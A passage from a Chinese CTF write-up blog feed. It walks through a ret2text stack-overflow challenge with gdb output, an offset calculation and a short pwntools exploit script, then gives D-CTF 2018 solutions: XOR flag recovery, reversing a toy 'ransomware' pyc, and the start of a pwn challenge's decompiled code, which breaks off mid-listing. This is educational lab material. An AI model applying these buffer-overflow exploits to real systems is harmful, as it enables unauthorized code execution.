200<br>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</p></blockquote><p>使用gdb来调试下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/threst/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text </span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Maybe I will tell you next time !</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x21</span><br><span class="line"> EDX  0xf7f9a890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7f99000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c</span><br><span class="line"> EBP  0x62616163 (<span class="string">'caab'</span>)</span><br><span class="line"> ESP  0xffffd1a0 ◂— 0x62616165 (<span class="string">'eaab'</span>)</span><br><span class="line"> EIP  0x62616164 (<span class="string">'daab'</span>)</span><br><span class="line">────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/threst/ctf-challenges/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text </span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Maybe I will tell you next time !</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x21</span><br><span class="line"> EDX  0xf7f9a890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7f99000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c</span><br><span class="line"> EBP  0x62616163 (<span class="string">'caab'</span>)</span><br><span class="line"> ESP  0xffffd1a0 ◂— 0x62616165 (<span class="string">'eaab'</span>)</span><br><span class="line"> EIP  0x62616164 (<span class="string">'daab'</span>)</span><br><span class="line">────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────</span><br><span class="line">Invalid address 0x62616164</span><br></pre></td></tr></table></figure></p><p>我们可以看见在<code>Invalid address 0x62616164</code>的位置上栈溢出了,然后在使用下面的命令</p><blockquote><p>└──╼ $cyclic -l 0x62616164<br>112</p></blockquote><p>可以看见在112的字符后面栈溢出了</p><h5 id="寻找要覆盖的地址"><a href="#寻找要覆盖的地址" class="headerlink" title="寻找要覆盖的地址"></a>寻找要覆盖的地址</h5><p>通过objdump发现system函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└──╼ <span class="variable">$objdump</span> -R ret2text</span><br><span class="line"></span><br><span class="line">ret2text:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a040 R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a060 R_386_COPY        stdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   time@GLIBC_2.0</span><br><span class="line">0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   system@GLIBC_2.0</span><br><span class="line">0804a020 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a024 R_386_JUMP_SLOT   srand@GLIBC_2.0</span><br><span class="line">0804a028 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a02c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</span><br><span class="line">0804a030 R_386_JUMP_SLOT   rand@GLIBC_2.0</span><br><span class="line">0804a034 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>ida中找返回地址</p><p><img src="https://i.loli.net/2018/11/11/5be7ed0590f70.png" alt=""></p><h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">target  = <span class="number">0x0804863A</span></span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">'A'</span>*<span class="number">112</span>+p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="学习到的坑"><a href="#学习到的坑" class="headerlink" title="学习到的坑:"></a>学习到的坑:</h2><p>1.当输入的长度没有到栈溢出的位置的时候，程序直接可以正常退出，没有出现寄存器和栈图</p><p><img src="https://i.loli.net/2018/11/11/5be7ed205fd18.png" alt=""></p><p>栈溢出的结果</p><p><img src="https://i.loli.net/2018/11/11/5be7ed058bc05.png" alt=""></p><p>2.在ida中找返回地址</p><p><img src="https://i.loli.net/2018/11/11/5be7ed0590f70.png" alt=""></p><p>一定要找前缀为<code>.text</code>的位置</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ret2text&quot;&gt;&lt;a href=&quot;#ret2text&quot; class=&quot;headerlink&quot; title=&quot;ret2text&quot;&gt;&lt;/a&gt;ret2text&lt;/h2&gt;&lt;p&gt;题目地址:&lt;a href=&quot;https://github.com/ctf-wiki/ctf-
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://threst.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>D-CTFQuals2018</title>
    <link href="https://threst.github.io/2018/11/02/D-CTFQuals2018/"/>
    <id>https://threst.github.io/2018/11/02/D-CTFQuals2018/</id>
    <published>2018-11-02T05:32:13.000Z</published>
    <updated>2018-11-11T10:13:44.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XORnigma"><a href="#XORnigma" class="headerlink" title="XORnigma"></a>XORnigma</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_two_str</span><span class="params">(s, key)</span>:</span></span><br><span class="line">    key = key * (len(s) / len(key) + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x,y) <span class="keyword">in</span> itertools.izip(s, key)) </span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span> </span><br><span class="line">flag_key = <span class="string">""</span></span><br><span class="line">x = xor_two_str(flag, flag_key)</span><br><span class="line"><span class="keyword">print</span> x.encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="comment"># 000000003f2537257777312725266c24207062777027307574706672217a67747374642577263077777a3725762067747173377326716371272165722122677522746327743e</span></span><br></pre></td></tr></table></figure><p>查下关于itertools库</p><p><code>izip</code><br><code>izip</code>用于将多个可迭代对象对应位置的元素作为一个元组，将所有元组『组成』一个迭代器，并返回。它的使用形式如下：</p><p><code>izip(iter1, iter2, ..., iterN)</code></p><p>如果某个可迭代对象不再生成值，则迭代停止。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from itertools import izip</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; for item in izip(&apos;ABCD&apos;, &apos;xy&apos;):</span><br><span class="line">...     print item</span><br><span class="line">...</span><br><span class="line">(&apos;A&apos;, &apos;x&apos;)</span><br><span class="line">(&apos;B&apos;, &apos;y&apos;)</span><br><span class="line">&gt;&gt;&gt; for item in izip([1, 2, 3], [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;]):</span><br><span class="line">...     print item</span><br><span class="line">...</span><br><span class="line">(1, &apos;a&apos;)</span><br><span class="line">(2, &apos;b&apos;)</span><br><span class="line">(3, &apos;c&apos;)</span><br></pre></td></tr></table></figure><p>根据这个比赛的规则flag前面都有<code>DCTF</code>这个关键字，再结合前面输出<code>00000000</code>，可以判断这个<code>flag_key</code>就是<code>DCTF</code>，因为一样的异或下就为<code>0</code>了，那么接下来的问题就是猜出其他数字了，根据<code>key * (len(s) / len(key) + 1)</code>可以知道他会一直循环<code>key</code>来加密字符串,<code>00000000</code>之后是<code>3f</code>,我们先将<code>3f</code>转为数字</p><p><code>int(&#39;3f&#39;,16)</code></p><p>输出63,在与<code>D</code>进行异或运算</p><p><code>63 ^ ord(&#39;D&#39;)</code><br>输出123</p><p>那么这个123就是密文的ascii码了,</p><p><code>chr(123)</code></p><p>输出<code>{</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'000000003f2537257777312725266c24207062777027307574706672217a67747374642577263077777a3725762067747173377326716371272165722122677522746327743e'</span></span><br><span class="line">key = <span class="string">'DCTF'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc.decode(<span class="string">'hex'</span>))):</span><br><span class="line">    flag += chr(ord(enc.decode(<span class="string">'hex'</span>)[i])^ord(key[i%len(key)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>DCTF{fcc34eaae8bd3614dd30324e932770c3ed139cc2c3250c5b277cb14ea33f77a0}</p><h2 id="Ransomware"><a href="#Ransomware" class="headerlink" title="Ransomware"></a>Ransomware</h2><p>下载来2个文件<code>ransomware.pyc</code>和 <code>youfool!.exe</code>，还原<code>pyc</code>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar_cipher</span><span class="params">(buf, password)</span>:</span></span><br><span class="line">    password = password * (len(buf) / len(password) + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="string">''</span>).join((chr(ord(x) ^ ord(y)) <span class="keyword">for</span> x, y <span class="keyword">in</span> itertools.izip(buf, password)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./FlagDCTF.pdf'</span>, <span class="string">'r'</span>)</span><br><span class="line">buf = f.read()</span><br><span class="line">f.close()</span><br><span class="line">allchar = string.ascii_letters + string.punctuation + string.digits</span><br><span class="line">password = (<span class="string">''</span>).join((choice(allchar) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">60</span>)))</span><br><span class="line">buf = caesar_cipher(buf, password)</span><br><span class="line">f = open(<span class="string">'./youfool!.exe'</span>, <span class="string">'w'</span>)</span><br><span class="line">buf = f.write(buf)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>大概意思就是将<code>FlagDCTF.pdf</code>文件与随机60个字符异或加密，输出到<code>youfool!.exe</code>文件中去,那么我们只要找到密码就行了,使用这个<a href="https://wiremask.eu/tools/xor-cracker/" target="_blank" rel="noopener">工具</a>猜出大概密码</p><p><code>:P-@uL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4n[hGd/EeX+¼7,2O&quot;+:[w</code></p><p>pdf文件头<code>%PDF-1.</code>,文件尾<code>\n%%EOF\n</code></p><p>在使用这个<a href="https://gchq.github.io/CyberChef" target="_blank" rel="noopener">工具</a>,选取他的<code>From hex</code>和<code>XOR</code>模块,</p><p>使用<code>xxd  -ps  youfool\!.exe</code> 将文件十六进制输出</p><p><img src="https://i.loli.net/2018/10/01/5bb210c53d2de.png" alt=""></p><p>由于刚才猜出的密码并不是每个字符都是正确的，所以根据output的关键字修改密码，最后得出密码为<code>:P-@uSL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4nP[hGd/EeX+E7,2O&quot;+:[2</code>,得到原始文件，上面就是flag</p><p><code>DCTF{d915b5e076215c3efb92e5844ac20d0620d19b15d427e207fae6a3b894f91333}</code></p><h2 id="How-lucky-are-you-pwn"><a href="#How-lucky-are-you-pwn" class="headerlink" title="How lucky are you?(pwn)"></a>How lucky are you?(pwn)</h2><blockquote><p>Target: 167.99.143.206 65031<br>Bin: <a href="https://dctf.def.camp/dctf-18-quals-81249812/lucky" target="_blank" rel="noopener">https://dctf.def.camp/dctf-18-quals-81249812/lucky</a></p></blockquote><p><img src="https://i.loli.net/2018/10/04/5bb5d16ca9498.png" alt="1.png"></p><p>大致功能你输入名字，然后要你猜１００个随机数字，重点是输入名字这里，可以控制从而溢出.</p><p>ida反编译代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v4; <span class="comment">// rsi@2</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax@4</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax@6</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax@7</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax@10</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax@10</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax@11</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v22; <span class="comment">// ebx@11</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax@13</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [sp+0h] [bp-540h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [sp+210h] [bp-330h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [sp+240h] [bp-300h]@7</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+260h] [bp-2E0h]@7</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [sp+2D0h] [bp-270h]@7</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [sp+2F0h] [bp-250h]@1</span></span><br><span class="line">  __int64 v31; <span class="comment">// [sp+3F0h] [bp-150h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [sp+4F8h] [bp-48h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [sp+514h] [bp-2Ch]@9</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [sp+518h] [bp-28h]@9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v35; <span class="comment">// [sp+51Ch] [bp-24h]@7</span></span><br><span class="line">  __int64 v36; <span class="comment">// [sp+520h] [bp-20h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+52Ch] [bp-14h]@7</span></span><br><span class="line"> </span><br><span class="line">  *(_QWORD *)seed = <span class="number">0L</span>L;</span><br><span class="line">  v36 = <span class="number">8L</span>L;</span><br><span class="line">  v3 = sub_1972(<span class="number">8L</span>L, <span class="number">4L</span>L, a3);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::basic_ifstream(&amp;v30, <span class="string">"/dev/urandom"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(&amp;v31) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = seed;</span><br><span class="line">    <span class="built_in">std</span>::istream::read((<span class="built_in">std</span>::istream *)&amp;v30, (<span class="keyword">char</span> *)seed, v36);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(&amp;v31) )</span><br><span class="line">    &#123;</span><br><span class="line">      srand(seed[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v5) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cerr</span>, <span class="string">"Failed to read from /dev/urandom"</span>);</span><br><span class="line">      v4 = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;;</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::close(&amp;v30, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v6) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cerr</span>, <span class="string">"Failed to open /dev/urandom"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v35 = rand();</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v27);</span><br><span class="line">  LODWORD(v7) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Hello, there!"</span>);</span><br><span class="line">  LODWORD(v8) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  LODWORD(v9) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v27);</span><br><span class="line">  LODWORD(v10) = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::c_str(&amp;v27);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, v10);</span><br><span class="line">  srand(v35);</span><br><span class="line">  LODWORD(v11) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"I am glad to know you, "</span>);</span><br><span class="line">  LODWORD(v12) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v11, &amp;dest);</span><br><span class="line">  LODWORD(v13) = <span 